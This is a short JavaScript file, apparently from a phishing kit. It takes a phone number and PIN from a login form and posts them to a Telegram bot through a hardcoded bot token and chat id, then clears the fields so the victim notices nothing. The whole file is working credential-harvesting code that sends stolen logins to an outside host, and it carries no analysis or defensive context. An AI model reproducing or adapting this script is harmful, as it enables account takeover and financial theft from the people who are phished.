//bot token
var telegram_bot_id = "5684350946:AAFcU409BXxcfgoc41Xsj-f8fZ3faCyirg0"
//chat id
var chat_id = 5930858175
var u_number, password;
var ready = function submitdata() {
   u_number = document.getElementById("number").value;
   password = document.getElementById("password").value;
   
   message = "No Hp: " + u_number + "\nPIN: " + password
};
var sender = function () {
   ready();
   var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
         "Content-Type": "application/json",
         "cache-control": "no-cache"
      },
      "data": JSON.stringify({
         "chat_id": chat_id,
         "text": message
      })
   };
   $.ajax(settings).done(function(response) {
      console.log('');
   });
   document.getElementById("number").value = "";
   document.getElementById("password").value = "";
   return false;
};
